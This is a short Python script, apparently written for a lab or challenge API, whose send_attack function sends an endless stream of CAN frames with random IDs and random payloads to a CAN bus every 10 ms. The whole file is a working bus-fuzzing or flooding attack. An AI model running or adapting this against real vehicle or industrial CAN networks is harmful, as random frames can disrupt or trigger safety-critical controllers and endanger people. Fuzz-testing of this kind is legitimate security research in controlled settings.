#!/usr/bin/env python3
from can_api import cansend
import can
import random
import time

def message_to_frame(msg: can.Message) -> str:
    """Convert python-can Message to cansend() frame string."""
    can_id = f"{msg.arbitration_id:03X}"
    data_hex = msg.data.hex().upper()
    return f"{can_id}#{data_hex}"

# example usage in their own logic
def send_attack():
    while True:
        arb_id = random.randint(0x000, 0x7FF)
        dlc = random.randint(0, 8)
        data = bytes(random.getrandbits(8) for _ in range(dlc))

        msg = can.Message(
            arbitration_id=arb_id,
            data=data,
            is_extended_id=False,
        )

        # Convert python-can msg -> API string format
        frame = message_to_frame(msg)

        # Send over API
        response = cansend(frame)
        print("API response:", response)

        time.sleep(0.01)  # avoid spamming too fast

if __name__ == '__main__':
    send_attack()
